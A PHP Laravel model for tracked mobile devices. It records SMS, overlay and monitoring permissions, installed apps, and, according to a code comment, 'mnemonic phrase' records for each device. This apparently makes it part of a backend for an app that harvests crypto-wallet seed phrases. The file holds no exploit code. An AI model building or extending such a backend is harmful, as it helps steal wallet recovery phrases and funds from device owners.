<?php

namespace App\Models;

use Illuminate\Database\Eloquent\SoftDeletes;

class Device extends BaseModel
{
    use SoftDeletes;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'device_number',
        'appName',
        'appVersion',
        'app_channel',
        'language',
        'region',
        'ip',
        'brand',
        'model',
        'sdk_version',
        'account',
        'tg',
        'proxy',
        'tags',
        'float_window_permission',
        'sms_permission',
        'monitor_permission',
        'has_card',
        'has_sms',
        'install_time_distance',
        'screen_interval_time',
        'has_screen_popup_card',
        'has_fullscreen_mode',
        'open_count',
        'country'
    ];

    /**
     * 过滤XSS风险字符
     * 
     * @param string $value
     * @return string
     */
    protected function sanitizeString($value)
    {
        if (is_null($value)) {
            return null;
        }
        
        // 移除HTML标签和PHP标签
        $value = strip_tags($value);
        
        // 转义特殊字符，防止XSS
        $value = htmlspecialchars($value, ENT_QUOTES, 'UTF-8', false);
        
        // 移除控制字符（除了换行符、制表符、回车符）
        $value = preg_replace('/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/', '', $value);
        
        return trim($value);
    }

    /**
     * 设置设备号属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setDeviceNumberAttribute($value)
    {
        $this->attributes['device_number'] = $this->sanitizeString($value);
    }

    /**
     * 设置应用名称属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setAppNameAttribute($value)
    {
        $this->attributes['appName'] = $this->sanitizeString($value);
    }

    /**
     * 设置应用版本属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setAppVersionAttribute($value)
    {
        $this->attributes['appVersion'] = $this->sanitizeString($value);
    }

    /**
     * 设置应用渠道属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setAppChannelAttribute($value)
    {
        $this->attributes['app_channel'] = $this->sanitizeString($value);
    }

    /**
     * 设置语言属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setLanguageAttribute($value)
    {
        $this->attributes['language'] = $this->sanitizeString($value);
    }

    /**
     * 设置地区属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setRegionAttribute($value)
    {
        $this->attributes['region'] = $this->sanitizeString($value);
    }

    /**
     * 设置品牌属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setBrandAttribute($value)
    {
        $this->attributes['brand'] = $this->sanitizeString($value);
    }

    /**
     * 设置型号属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setModelAttribute($value)
    {
        $this->attributes['model'] = $this->sanitizeString($value);
    }

    /**
     * 设置SDK版本属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setSdkVersionAttribute($value)
    {
        $this->attributes['sdk_version'] = $this->sanitizeString($value);
    }

    /**
     * 设置账号属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setAccountAttribute($value)
    {
        $this->attributes['account'] = $this->sanitizeString($value);
    }

    /**
     * 设置TG属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setTgAttribute($value)
    {
        $this->attributes['tg'] = $this->sanitizeString($value);
    }

    /**
     * 设置代理属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setProxyAttribute($value)
    {
        $this->attributes['proxy'] = $this->sanitizeString($value);
    }

    /**
     * 设置标签属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setTagsAttribute($value)
    {
        $this->attributes['tags'] = $this->sanitizeString($value);
    }

    /**
     * 设置国家属性（过滤XSS）
     *
     * @param string $value
     * @return void
     */
    public function setCountryAttribute($value)
    {
        $this->attributes['country'] = $this->sanitizeString($value);
    }

    /**
     * 设备关联的助记词记录
     *
     * @return \Illuminate\Database\Eloquent\Relations\HasMany
     */
    public function receiveWords()
    {
        return $this->hasMany(ReceiveWords::class, 'device_id');
    }

    /**
     * 设备关联的应用列表（通过设备号关联）
     *
     * @return \Illuminate\Database\Eloquent\Relations\HasMany
     */
    public function receiveApps()
    {
        return $this->hasMany(ReceiveApps::class, 'device_number', 'device_number');
    }
}

